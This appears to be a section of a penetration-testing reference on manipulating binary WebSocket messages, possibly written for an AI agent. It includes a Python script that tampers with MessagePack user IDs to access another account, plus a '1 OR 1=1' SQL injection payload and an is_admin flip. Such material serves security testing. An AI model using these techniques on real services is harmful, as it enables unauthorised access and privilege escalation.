# websocket-security technical reference

For other original section numbers, use the [entry index](../SKILL.md#references).

## 11. BINARY WEBSOCKET MESSAGE MANIPULATION

### Protobuf deserialization

Applications using Protocol Buffers over WebSocket may be vulnerable to:

```text
1. Capture binary WebSocket frame
2. Decode protobuf structure (use protoc --decode_raw or protobuf-inspector)
3. Modify field values (e.g., change user_id, amount, role)
4. Re-encode and send modified frame
5. Server deserializes without re-validating field constraints
```

```bash
# Decode captured binary frame
echo "CAPTURED_HEX" | xxd -r -p | protoc --decode_raw

# Output: field structure with types and values
# Modify, re-encode, send back through WebSocket
```

### MessagePack deserialization

```python
import msgpack
import websocket

ws = websocket.create_connection('wss://target.com/ws')

# Decode received binary message
raw = ws.recv()
data = msgpack.unpackb(raw, raw=False)
# data = {'action': 'get_balance', 'user_id': 123}

# Modify and re-send
data['user_id'] = 1  # IDOR: access admin's balance
ws.send(msgpack.packb(data), opcode=0x2)
```

### Type confusion attacks

Binary serialization formats may allow type confusion:

```text
# Original: user_id as integer (field type 0)
# Modified: user_id as string "1 OR 1=1" (field type 2)
# If server doesn't validate types after deserialization → SQL injection

# Original: is_admin as boolean false (0x00)
# Modified: is_admin as boolean true (0x01)
# Direct privilege escalation if server trusts deserialized values
```

### Tools for binary WebSocket analysis

| Tool | Purpose |
|------|---------|
| Burp Suite + SocketSleuth | Intercept and modify binary frames |
| `protobuf-inspector` | Decode unknown protobuf structures |
| `msgpack-tools` | Encode/decode MessagePack CLI |
| `wsdump` (websocket-client) | Raw frame capture and replay |
| Wireshark | Dissect WebSocket frames at protocol level |
